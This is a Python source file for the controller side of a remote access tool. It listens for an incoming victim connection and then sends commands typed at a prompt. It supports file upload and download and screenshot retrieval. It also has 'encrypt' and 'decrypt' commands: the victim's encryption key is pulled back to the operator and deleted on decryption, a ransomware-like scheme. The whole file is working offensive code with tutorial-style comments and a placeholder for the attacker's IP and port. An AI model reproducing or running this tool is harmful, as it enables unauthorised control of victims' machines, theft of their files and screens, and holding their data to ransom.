#!/usr/bin/python
# -*- coding: utf-8 -*-
import os, sys, socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                #Create a socket object
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)              #Change the options of the socket object using the setsockopt method (in the socket.SOL_SOCKET layer, change the value of the socket.SO_REUSEADDR field to 1, to be able to reconnect to the previous address again)
        listener.bind((ip, port))                                                   #Bind the listener to the ip and port
        listener.listen(0)                                                          #We start listening to our port for incoming messages (0 is the number of sockets, after which our port will start dropping all other connections)
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()                                #listener.accept() allows us to receive messages to our port. It also returns two values - socket object and the address it came from.
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):                                                  #Sending data in bytes to client
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())


    def reliable_receive(self):                                                    #Receiving data from client and converting JSON encoded data into Python objects with [json.loads]
        json_data = ''.encode()
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_remotely(self, command):                                        #Execution of commands and "communication" with the client's computer
        self.reliable_send(command)                                             #Send a command to the sending socket object
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):                                       #Writing data in bytes to some file
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] File was downloaded successfully"


    def read_file(self, path):                                                #Reading file and decoding it to ASCII
        with open(path, "rb") as file:
            return (base64.b64encode(file.read())).decode("ascii")


    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
            except:
                result = "[!] Error during uploading file."


            try:
                if command[0] == "decrypt":
                    file_content = self.read_file(command[1]+'.key')
                    command.append(file_content)
                    os.remove(command[1]+'.key')
            except:
                result = "[!] Error during decoding file."



            result = self.execute_remotely(command)

            try:
                if command[0] == "encrypt" and "[!] Error " not in result:
                    result = self.write_file(command[1] + ".key", result)
            except:
                result = "[!] Error during encoding file."


            try:
                if command[0] == "screenshot" and "[!] Error " not in result:
                    result = self.write_file(command[1], result)
            except:
                result = "[!] Error during downloading screenshot file."

            try:
                if command[0] == "download" and "[!] Error " not in result:
                    result = self.write_file(command[1], result)
            except:
                result = "[!] Error during downloading file."

            print(result)

my_listener = Listener("your_ip", your_port)                                        #TYPE YOUR IP AND PORT                         
my_listener.run()
